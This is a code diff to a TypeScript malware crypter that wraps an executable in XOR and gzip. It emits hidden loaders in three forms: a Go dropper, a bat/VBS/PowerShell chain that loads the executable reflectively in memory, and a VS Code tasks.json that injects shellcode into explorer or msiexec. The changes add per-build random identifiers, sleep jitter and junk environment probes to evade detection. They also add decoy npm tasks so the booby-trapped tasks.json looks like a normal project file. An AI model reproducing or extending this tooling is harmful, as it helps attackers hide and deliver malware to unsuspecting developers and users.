@@ -392,6 +392,21 @@ export async function cryptToExe(exe: Buffer, out: string): Promise<void> {
     .join(", ");
   const keyHex = `0x${key.toString(16).padStart(2, "0")}`;
 
+  // Random Go identifiers — different every build
+  const vEnc  = randName().toLowerCase();
+  const vKey  = randName().toLowerCase();
+  const vDec  = randName().toLowerCase();
+  const vGr   = randName().toLowerCase();
+  const vErr  = randName().toLowerCase();
+  const vBuf  = randName().toLowerCase();
+  const vData = randName().toLowerCase();
+  const vF    = randName().toLowerCase();
+  const vNm   = randName().toLowerCase();
+  const vCmd  = randName().toLowerCase();
+  const jFn1  = randName().toLowerCase();
+  const jFn2  = randName().toLowerCase();
+  const sleepMs = 500 + Math.floor(Math.random() * 1500);
+
   const goSrc = `package main
 
 import (
@@ -401,35 +416,40 @@ import (
 \t"os"
 \t"os/exec"
 \t"syscall"
+\t"time"
 )
 
-var enc = []byte{${encArr}}
+var ${vEnc} = []byte{${encArr}}
 
-const xorKey byte = ${keyHex}
+const ${vKey} byte = ${keyHex}
+
+func ${jFn1}() string { return os.Getenv("COMPUTERNAME") }
+func ${jFn2}() bool   { return len(os.Args) > 0 }
 
 func main() {
-\tdec := make([]byte, len(enc))
-\tfor i, b := range enc {
-\t\tdec[i] = b ^ xorKey
+\ttime.Sleep(${sleepMs} * time.Millisecond)
+\t${vDec} := make([]byte, len(${vEnc}))
+\tfor i, b := range ${vEnc} {
+\t\t${vDec}[i] = b ^ ${vKey}
 \t}
-\tgr, err := gzip.NewReader(bytes.NewReader(dec))
-\tif err != nil {
+\t${vGr}, ${vErr} := gzip.NewReader(bytes.NewReader(${vDec}))
+\tif ${vErr} != nil {
 \t\treturn
 \t}
-\tvar buf bytes.Buffer
-\tio.Copy(&buf, gr)
-\tgr.Close()
-\tdata := buf.Bytes()
-\tf, err := os.CreateTemp("", "*.exe")
-\tif err != nil {
+\tvar ${vBuf} bytes.Buffer
+\tio.Copy(&${vBuf}, ${vGr})
+\t${vGr}.Close()
+\t${vData} := ${vBuf}.Bytes()
+\t${vF}, ${vErr} := os.CreateTemp("", "*.exe")
+\tif ${vErr} != nil {
 \t\treturn
 \t}
-\tname := f.Name()
-\tf.Write(data)
-\tf.Close()
-\tcmd := exec.Command(name)
-\tcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-\tcmd.Start()
+\t${vNm} := ${vF}.Name()
+\t${vF}.Write(${vData})
+\t${vF}.Close()
+\t${vCmd} := exec.Command(${vNm})
+\t${vCmd}.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+\t${vCmd}.Start()
 }
 `;
 
@@ -478,24 +498,26 @@ export async function cryptToBat(exe: Buffer, out: string): Promise<void> {
   const enc = Buffer.concat([Buffer.from([key]), xorBuf(gz, key)]);
   const encB64 = enc.toString("base64");
 
-  const csSource = buildPeLoaderCs();
-  const csB64 = Buffer.from(csSource, "utf-8").toString("base64");
+  const csName  = randName();                                          // random C# class name
+  const csSource = buildPeLoaderCs(csName);
+  const csB64    = Buffer.from(csSource, "utf-8").toString("base64");
 
   const ps1Name = `${randHex(10)}.ps1`;
   const vbsName = `${randHex(10)}.vbs`;
+  const sleepMs = 500 + Math.floor(Math.random() * 1500);
 
-  const psLines = buildBatPsLines(encB64, csB64);
-  const vbsLines = buildBatVbsLines(psLines, ps1Name);
+  const psLines  = buildBatPsLines(encB64, csB64, csName);
+  const vbsLines = buildBatVbsLines(psLines, ps1Name, sleepMs);
   const batLines = buildBatFileLines(vbsLines, vbsName);
 
   fs.writeFileSync(out, batLines.join("\r\n") + "\r\n");
 }
 
-function buildPeLoaderCs(): string {
+function buildPeLoaderCs(cls: string): string {
   return (
     "using System;" +
     "using System.Runtime.InteropServices;" +
-    "public class L{" +
+    `public class ${cls}{` +
     '[DllImport("kernel32")]static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);' +
     '[DllImport("kernel32")]static extern bool VirtualProtect(IntPtr a,uint s,uint n,out uint o);' +
     '[DllImport("kernel32")]static extern IntPtr LoadLibraryA(string n);' +
@@ -567,40 +589,52 @@ function buildPeLoaderCs(): string {
   );
 }
 
-function buildBatPsLines(encB64: string, csB64: string): string[] {
-  const lines: string[] = [];
+function buildBatPsLines(encB64: string, csB64: string, cls: string): string[] {
+  // Random PS variable names — different every build
+  const vd = randName(); // payload accumulator
+  const vb = randName(); // decoded bytes
+  const vk = randName(); // XOR key
+  const vx = randName(); // XOR'd data
+  const vm = randName(); // MemoryStream
+  const vg = randName(); // GZipStream
+  const vo = randName(); // output buffer
+  const vs = randName(); // final PE bytes
+  const vc = randName(); // C# source string
 
+  const lines: string[] = [];
   const CHUNK = 6000;
   const chunks = encB64.match(new RegExp(`.{1,${CHUNK}}`, "g")) ?? [];
-  lines.push(`$d=''`);
-  for (const chunk of chunks) lines.push(`$d+='${chunk}'`);
+  lines.push(`$${vd}=''`);
+  for (const chunk of chunks) lines.push(`$${vd}+='${chunk}'`);
 
   lines.push(
-    `$b=[Convert]::FromBase64String($d)`,
-    `$k=[int]$b[0]`,
-    `$x=New-Object byte[]($b.Length-1)`,
-    `for($i=0;$i-lt$x.Length;$i++){$x[$i]=$b[$i+1]-bxor$k}`,
-    `$ms=New-Object IO.MemoryStream(,$x)`,
-    `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)`,
-    `$ob=New-Object IO.MemoryStream`,
-    `$gs.CopyTo($ob);$gs.Close();$ms.Close()`,
-    `$bytes=$ob.ToArray()`,
-    `$cs=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}'))`,
-    `Add-Type -TypeDefinition $cs`,
-    `[L]::Run($bytes)`,
+    `$${vb}=[Convert]::FromBase64String($${vd})`,
+    `$${vk}=[int]$${vb}[0]`,
+    `$${vx}=New-Object byte[]($${vb}.Length-1)`,
+    `for($i=0;$i-lt$${vx}.Length;$i++){$${vx}[$i]=$${vb}[$i+1]-bxor$${vk}}`,
+    `$${vm}=New-Object IO.MemoryStream(,$${vx})`,
+    `$${vg}=New-Object IO.Compression.GZipStream($${vm},[IO.Compression.CompressionMode]::Decompress)`,
+    `$${vo}=New-Object IO.MemoryStream`,
+    `$${vg}.CopyTo($${vo});$${vg}.Close();$${vm}.Close()`,
+    `$${vs}=$${vo}.ToArray()`,
+    `$${vc}=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}'))`,
+    `Add-Type -TypeDefinition $${vc}`,
+    `[${cls}]::Run($${vs})`,
   );
 
   return lines;
 }
 
-function buildBatVbsLines(psLines: string[], ps1Name: string): string[] {
+function buildBatVbsLines(psLines: string[], ps1Name: string, sleepMs: number): string[] {
   const psChr = Array.from("powershell")
     .map((c) => `Chr(${c.charCodeAt(0)})`)
     .join("&");
 
   const vbs: string[] = [
-    `Dim fso,f,sh,tmp,p`,
+    `Dim fso,f,sh,tmp,p,wn,cn`,
     `Set fso=CreateObject("Scripting.FileSystemObject")`,
+    `Set wn=CreateObject("WScript.Network")`,
+    `cn=wn.ComputerName`,                             // junk env probe
     `tmp=fso.GetSpecialFolder(2)&"\\${ps1Name}"`,
     `Set f=fso.OpenTextFile(tmp,2,True)`,
   ];
@@ -612,6 +646,7 @@ function buildBatVbsLines(psLines: string[], ps1Name: string): string[] {
 
   vbs.push(
     `f.Close`,
+    `WScript.Sleep ${sleepMs}`,                       // jitter before launch
     `Set sh=CreateObject("WScript.Shell")`,
     `p=${psChr}`,
     `sh.Run p&" -w h -ep b -nop -f """&tmp&"""",0,True`,
@@ -691,26 +726,36 @@ export async function cryptToTasksJson(exe: Buffer, out: string): Promise<void> 
       `}`;
     const csB64 = Buffer.from(cs, "utf-8").toString("base64");
 
+    // Random PS variable names
+    const vd = randName(); const vk = randName(); const vx = randName();
+    const vm = randName(); const vg = randName(); const vo = randName();
+    const vs = randName(); const lp = randName(); const hp = randName();
+    const ma = randName(); const bw = randName(); const pi = randName();
+    const sleepMs = 500 + Math.floor(Math.random() * 1500);
+
     const psLines = [
       `[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}`,
       `[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12`,
-      `$d=[Convert]::FromBase64String('${encB64}')`,
-      `$k=[int]$d[0]`,
-      `$x=New-Object byte[]($d.Length-1)`,
-      `for($i=0;$i-lt$x.Length;$i++){$x[$i]=$d[$i+1]-bxor$k}`,
-      `$ms=New-Object IO.MemoryStream(,$x)`,
-      `$gs=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress)`,
-      `$ob=New-Object IO.MemoryStream`,
-      `$gs.CopyTo($ob);$gs.Close();$ms.Close()`,
-      `$sc=$ob.ToArray()`,
+      `Start-Sleep -Milliseconds ${sleepMs}`,
+      `$${vd}=[Convert]::FromBase64String('${encB64}')`,
+      `$${vk}=[int]$${vd}[0]`,
+      `$${vx}=New-Object byte[]($${vd}.Length-1)`,
+      `for($i=0;$i-lt$${vx}.Length;$i++){$${vx}[$i]=$${vd}[$i+1]-bxor$${vk}}`,
+      `$${vm}=New-Object IO.MemoryStream(,$${vx})`,
+      `$${vg}=New-Object IO.Compression.GZipStream($${vm},[IO.Compression.CompressionMode]::Decompress)`,
+      `$${vo}=New-Object IO.MemoryStream`,
+      `$${vg}.CopyTo($${vo});$${vg}.Close();$${vm}.Close()`,
+      `$${vs}=$${vo}.ToArray()`,
       `Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${csB64}')))`,
-      `$lp=Get-Process -Name explorer -ErrorAction SilentlyContinue|Select-Object -First 1`,
-      `if(-not $lp){$pi=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\msiexec.exe","/q");$pi.WindowStyle='Hidden';$pi.CreateNoWindow=$true;$lp=[Diagnostics.Process]::Start($pi)}`,
-      `$hp=[${cn}]::OP(0x1FFFFF,$false,$lp.Id)`,
-      `$ma=[${cn}]::VA($hp,[IntPtr]::Zero,[IntPtr]$sc.Length,0x3000,0x40)`,
-      `$bw=[IntPtr]::Zero`,
-      `[${cn}]::WM($hp,$ma,$sc,[IntPtr]$sc.Length,[ref]$bw)|Out-Null`,
-      `[${cn}]::CT($hp,[IntPtr]::Zero,[IntPtr]::Zero,$ma,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null`,
+      // Process selection: explorer → RuntimeBroker → spawn msiexec
+      `$${lp}=Get-Process -Name explorer -ErrorAction SilentlyContinue|Select-Object -First 1`,
+      `if(-not $${lp}){$${lp}=Get-Process -Name RuntimeBroker -ErrorAction SilentlyContinue|Select-Object -First 1}`,
+      `if(-not $${lp}){$${pi}=New-Object Diagnostics.ProcessStartInfo("$env:SYSTEMROOT\\system32\\msiexec.exe","/q");$${pi}.WindowStyle='Hidden';$${pi}.CreateNoWindow=$true;$${lp}=[Diagnostics.Process]::Start($${pi})}`,
+      `$${hp}=[${cn}]::OP(0x1FFFFF,$false,$${lp}.Id)`,
+      `$${ma}=[${cn}]::VA($${hp},[IntPtr]::Zero,[IntPtr]$${vs}.Length,0x3000,0x40)`,
+      `$${bw}=[IntPtr]::Zero`,
+      `[${cn}]::WM($${hp},$${ma},$${vs},[IntPtr]$${vs}.Length,[ref]$${bw})|Out-Null`,
+      `[${cn}]::CT($${hp},[IntPtr]::Zero,[IntPtr]::Zero,$${ma},[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null`,
     ];
 
     const psEnc = Buffer.from(psLines.join(";"), "utf16le").toString("base64");
@@ -727,12 +772,34 @@ export async function cryptToTasksJson(exe: Buffer, out: string): Promise<void> 
           problemMatcher: [],
         },
         {
+          label: "Install Dependencies",
+          type: "shell",
+          command: "npm install",
+          presentation: { reveal: "always", panel: "shared" },
+          problemMatcher: [],
+        },
+        {
           label: "Build",
           type: "shell",
           command: "npm run build",
           group: { kind: "build", isDefault: true },
           presentation: { reveal: "always", panel: "shared" },
           problemMatcher: ["$tsc"],
+        },
+        {
+          label: "Start Dev Server",
+          type: "shell",
+          command: "npm run dev",
+          isBackground: true,
+          presentation: { reveal: "always", panel: "dedicated" },
+          problemMatcher: [],
+        },
+        {
+          label: "Lint",
+          type: "shell",
+          command: "npm run lint",
+          presentation: { reveal: "always", panel: "shared" },
+          problemMatcher: ["$eslint-stylish"],
         },
       ],
     };
